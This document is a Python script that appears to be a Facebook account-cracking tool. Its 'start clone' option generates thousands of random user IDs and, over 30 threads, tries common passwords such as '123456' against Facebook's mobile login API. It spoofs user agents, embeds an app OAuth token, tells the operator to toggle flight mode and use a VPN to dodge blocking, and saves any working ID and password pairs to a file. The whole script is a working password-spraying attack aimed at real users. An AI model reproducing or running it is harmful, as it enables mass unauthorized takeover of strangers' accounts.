import os, sys, json, uuid, string, random, requests
from concurrent.futures import ThreadPoolExecutor
import os, sys, json, uuid, string, random, requests
from concurrent.futures import ThreadPoolExecutor as tred

loop = 0 
oks = []
cps = []
gen = []
#______________OLD UA_______________#
def SEX22():
    url5 = ["Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"]
    return random.choice(url5)
#______________OLD UA_______________#

def uax():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
    
def fuck_xnxx():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    url6=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return url6
#______________FILE UA_______________#
def fuck_xnxxxx():  
    mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F'])
    url1 = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return url1
#______________FILE UA_______________#
def fuck_xx():
        url3  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return url3
#______________FILE UA_______________#
def fuck_xnxxxxx():
    realmi = random.choice(["RMP2107","RMX3770","RMX2176","RMX3939","RMX3868"])
    url4 = "[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+realmi+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    return url4
#______________RANDOM UA_______________#
ua = "Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]"
#______________BANNER SYSTEM_______________#

def clear():os.system('clear')
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""\033[1;37m""")
    
#______________MAIN DEF_______________#
def main():
    ____banner____()
    print("[1] FILE CLONE [SOON] ")
    print("[2] RANDOM CLONEv[SOON]")
    print("[3] START CLONE [2009][WORK]")
    print("[4] NAGAD HALF INFO[]SOON")
    print("[5] NAGAD BAN [SOON]")
    print("-------------------------------")
    select = input("SELECT OPTION : ")
    if select == "3":
        fuckMyxAXN("100000")
    if select == "2":
    	print(" FUCK RANDOM")
    if select == "1":
    	print("COMIN SOON")
    if select == "4":
    	print("COMIN SOON")
    if select == "5":
        print("COMIN SOON")
    
    else:
        main()
        
#______________OLD DEF_______________#

def fuckMyxAXN(series):
    ____banner____()
   # os.system("xdg-open https://t.me/H41NA_SIKRA")
    global gen
    if series == "100000":
        SEX = "100000"
        SEX2 = 9
    else:
        SEX = "100000"
        SEX2 = 9
    for a in range(99999):
        AXN = "".join(random.choice(string.digits) for _ in range(SEX2))
        gen.append(AXN)
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ____banner____()
        print("TOTAL IDS - "+str(len(gen)))
        print("USE FLIGHT MODE EVERY 3 MIN")
        print("USE 1.1.1.1 VPN FOR GOOD RESULT")
        print("-------------------------------")
        for love in gen:
            ids = SEX + love
            passlist = ["123456", "123456789", "12345678", "1234567","1234567890"]
            Fuck_xnxx.submit(Fucking_life, ids, passlist)
    sys.exit("\n-------------------------------")
    
#______________OLD METHOD_______________#   

def Fucking_life(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rAXNxH41N4 [{loop}]|OK:[{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {'adid': str(uuid.uuid4()),'email': ids,'password': pas,'cpl': 'true','credentials_type': 'device_based_login_password',"source": "device_based_login",'error_detail_type': 'button_with_disabled','format': 'json','generate_session_cookies': '1','generate_analytics_claim': '1','generate_machine_id': '1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale": "en_US", "client_country_code": "US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {'content-type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': fuck_xnxx(),'accept-encoding': 'gzip, deflate','x-fb-http-engine': 'Liger'}
            url = "https://b-api.facebook.com/auth/login"
            response = requests.post(url, data=data, headers=head, verify=True).json()
            if "access_token" in response:
                print(f"\r\r\x1bAXN_H41N4-OK | {ids} • {pas}")
                open("/sdcard/AXN-OK.txt", "a").write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"\r\r\x1bAXN_H41N4-OK | {ids} • {pas}")
                open("/sdcard/AXN-OK.txt", "a").write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
        loop += 1
    except Exception as e:
        pass
        
if __name__ == "__main__":
    main()
